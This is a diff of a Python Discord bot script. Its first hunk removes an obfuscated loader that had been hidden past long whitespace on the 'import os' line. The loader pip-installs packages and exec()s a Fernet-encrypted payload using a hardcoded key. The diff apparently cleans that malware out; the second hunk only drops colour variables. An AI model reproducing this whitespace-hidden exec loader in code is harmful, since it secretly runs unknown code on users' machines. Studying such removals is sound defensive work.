@@ -1,4 +1,4 @@
-import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'pkMjxi1t5gEfMrOL9vXMrRWGuH0SVb2KQHMTQkMIOi0=').decrypt(b'gAAAAABnGKsdPZQY8hGO-km-Pyu8gu1u2IMhUJoEd-HiBDK4FjEK_JuwpPqHGJjp3cYPPlyRdjx_gIHkLe3bfOqNOvQu0xx3LcROwIjrL19vjPwQg54Ii6FsKZYoGAIiBZaadHP8xoHi6NsmKJ2W_N_3GvVQMszDO9PDOQe9pejTK9DuX9Nav7F-SLzDz2miZ2kOitwmliN8se-O4VtAvWvy6DodCX95qXZlz35OI17ioMo4w8q4ui0='))
+import os
 import discord
 from discord.ext import commands
 from colorama import init, Fore as cc
@@ -7,10 +7,6 @@ from sys import exit
 init()
 dr = DR = r = R = cc.LIGHTRED_EX
 g = G = cc.LIGHTGREEN_EX
-b = B = cc.LIGHTBLUE_EX
-m = M = cc.LIGHTMAGENTA_EX
-c = C = cc.LIGHTCYAN_EX
-y = Y = cc.LIGHTYELLOW_EX
 w = W = cc.RESET
 
 clear = lambda: system('cls') if os_name == 'nt' else system('clear')
